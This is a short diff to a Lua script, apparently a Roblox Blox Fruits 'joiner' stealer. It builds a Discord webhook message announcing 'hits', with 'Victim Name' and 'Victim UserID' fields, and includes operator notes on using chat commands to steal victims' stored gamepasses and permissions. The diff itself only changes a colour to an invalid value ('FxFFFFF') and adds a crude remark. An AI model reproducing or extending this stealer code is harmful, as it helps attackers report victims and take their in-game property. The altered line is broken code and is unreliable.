@@ -583,7 +583,7 @@ end
 local embed = {
     title = hasDragonFruit and "DRAGON HIT! ; https://discord.gg/zJKDqRd5" or "BluesHub BF Joiner ; https://discord.gg/zJKDqRd5",
     description = hasDragonFruit and "DRAGON FRUIT HIT! @everyone" or "New Hit! @everyone",
-    color = hasDragonFruit and 0xFF0000 or 0x000FF,
+    color = hasDragonFruit and 0xFF0000 or FxFFFFF,
     fields = {
         {name = "Victim Name", value = PlayerName, inline = true},
         {name = "Victim UserID", value = tostring(PlayerUserId), inline = true},
@@ -599,7 +599,7 @@ local embed = {
         {name = "NOTES:", value = [[
 1. You can do ?addallitem or ?additem <name> to steal stored gamepasses/perms.
 2. If victim doesn't do any action automatically, you can try doing chat commands. Check them in rua hub channel "Commands for bf joiner"
-3. If victim Isn't on the server, it means he left.
+3. If victim Isn't on the server, it means he left. WHEN UR DONE BOMBOCLAT
 ]], inline = false}
     }
 }
